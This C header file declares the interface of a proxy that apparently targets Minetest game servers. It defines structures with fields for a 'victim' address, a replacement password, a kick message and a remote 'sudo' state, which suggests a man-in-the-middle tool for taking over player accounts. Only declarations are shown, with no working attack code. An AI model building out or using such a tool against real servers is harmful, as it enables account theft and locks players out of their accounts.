#pragma once
#include <stdbool.h>
#include <stdint.h>
#include <arpa/inet.h>
#include "mtclient.h"

struct Proxy;

typedef struct ProxyArgs {
    void (*victim_passwort_changed_callback)(struct Proxy* proxy, char* username);
    char* remote_hostname;
    uint16_t remote_port;
    uint16_t port;
    char* victim_kick_message;
    char* new_password;
} ProxyArgs;

typedef enum ProxyStatus {
    PROXY_NOT_RUNNING,
    PROXY_WAIT,
    PROXY_REMOTE_LOGIN,
    PROXY_REMOTE_WAIT,
    PROXY_REMOTE_SUDO
} ProxyStatus;

typedef struct Proxy {
    void (*victim_passwort_changed_callback) (struct Proxy* proxy, char* username);
    bool running;
    MinetestClient client;
    ProxyStatus status;
    struct sockaddr_in victim_addr;
    int listen_fd;
    char* victim_kick_message;
    char* new_password;
} Proxy;

Proxy* init_proxy(ProxyArgs* args);
void start_proxy(Proxy* proxy, ProxyArgs* args);
void tick_proxy(Proxy* proxy, uint8_t* netbuff, size_t buffsize);

void halt_proxy(Proxy* proxy);
void free_proxy(Proxy** proxy);

// EOF